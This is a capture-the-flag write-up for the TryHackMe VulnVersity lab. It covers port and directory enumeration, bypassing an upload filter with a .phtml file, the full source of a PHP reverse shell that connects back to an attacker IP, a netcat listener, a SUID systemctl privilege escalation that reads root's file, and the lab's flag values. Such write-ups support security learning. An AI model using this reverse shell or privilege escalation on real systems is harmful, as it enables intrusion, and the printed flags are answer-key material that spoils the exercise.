---
layout: post
title: THM - VulnVersity
author: _f0rmat
date: 2025-08-07
tags: TryHackMe nmap gobuster GTFOBins phpreverseshell
category: CTF
---

```
Difficulty: Easy
Status: Complete
IP: 10.10.64.29
```

# Resolution summary
- Vulnversity box provided by Try Hack Me.
- Enumeration of website revealed an uploads page this then allowed a reverse shell payload to be uploaded and then access to user was compromised.
- Privesc to root using GTFOBin for SUID files.

## Improved skills
- nmap
- php reverse shell

## Used tools
- nmap
- gobuster
- GTFOBins

---

# Information Gathering
Scanned all ports:
```bash
nmap -p- -T5 10.10.64.29 -v

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```

Enumerated open ports:
```bash
nmap -p 21,22,139,445,3128,3333 -A 10.10.64.29 -v

PORT     STATE SERVICE     VERSION                                                                                                                                                                                                          
21/tcp   open  ftp         vsftpd 3.0.3                                                                                                                                                                                                     

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                                                                                                                     
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-05-09T03:48:40-04:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2023-05-09T07:48:40
|_  start_date: N/A

```

---

# Enumeration

## Port 3333 - Apache httpd 2.4.18 ((Ubuntu))

If we visit this site in a browser we are presented with this page:

[![1](/assets/blog/THM/VulnVersity/1.png)](/assets/blog/THM/VulnVersity/1.png)

We can further enumerate this with gobuster to find any hidden directories:

```shell 
gobuster dir -u http://10.10.64.29:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Results:
```shell
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.29:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/09 09:04:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.64.29:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.64.29:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.64.29:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.64.29:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.64.29:3333/internal/]
/server-status        (Status: 403) [Size: 301]
Progress: 220538 / 220561 (99.99%)
===============================================================
2023/05/09 09:13:39 Finished
===============================================================
```

We discover the page /internal/ has an upload form

[![2](/assets/blog/THM/VulnVersity/2.png)](/assets/blog/THM/VulnVersity/2.png)

After testing some example uploads I found that .php files were not allowed to be uploaded however using Burpsuite to automate this process a file with the extension .phtml was.

-----
# Exploitation

## PHP Reverse Shell

As this machine allows .phtml files to be uploaded I have modified an existing reverse shell poc.phtml.

```shell
poc.phtml

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '<ATTACKER IP>';  // CHANGE THIS
$port = 1337;           // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Firstly I run a listener service on my machine locally;

```shell
nc -lvnp 1337
```

And then upload the modified file with a call back to my machines IP address and port.

Subsequently I navigate to this new page:

[![3](/assets/blog/THM/VulnVersity/3.png)](/assets/blog/THM/VulnVersity/3.png)

We now have an shell onto the machine.

---

# Lateral Movement to user

## Local Enumeration

Now that we have a shell to the machine we can interact with it via the termainl and through some directory enumeration we can see an user of 'bill' and there is a user.txt falg in this directory.

```shell
$ ls
/
$ cd /home
$ ls
bill
$ cd bill
$ ls
user.txt
$ cat user.txt
********************************
```

---

# Privilege Escalation

## Local Enumeration

Now we have access to the machine we can try to search for files that have access to SUID (set owner userId upon execution) allowing us to run a command as root.

We can search for these with the following command:

```shell
find / -user root -perm -4000 -exec ls -ldb {} \;
```

Result:

```shell
***********SNIP**************
find: '/var/lib/polkit-1': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/php/sessions': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/spool/rsyslog': Permission denied
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
find: '/tmp/systemd-private-722e6bd860fc42afb6a1f1cf303af67a-systemd-timesyncd.service-9ayqc7': Permission denied
find: '/sys/fs/fuse/connections/39': Permission denied
find: '/sys/kernel/debug': Permission denied
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
find: '/root': Permission denied

```

We find an interesting result that has this permission - /bin/systemctl

## Privilege Escalation vector

As /bin/systemctl is available we can use an example from GTFOBins to Privesc to root;

[https://gtfobins.github.io/gtfobins/systemctl/#suid](https://gtfobins.github.io/gtfobins/systemctl/#suid)

```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

Executing this in the /bin directory will allow systemctl to run a temporary service and output the contents of /root/root.txt to /tmp/output which we can then access and read.

```shell
$ cd /tmp
$ ls
output
systemd-private-643950f4144544919af26418fc8b3521-systemd-timesyncd.service-EwuLH4
tmp.XE7MIHuwcQ
tmp.XE7MIHuwcQ.service
$ cat output
********************************
```

---

# Trophy & Loot

user.txt
```shell
8bd7992fbe8a6ad22a63361004cfcedb
```

root.txt

```shell
a58ff8579f0a9270368d33a9966c7fd5
```
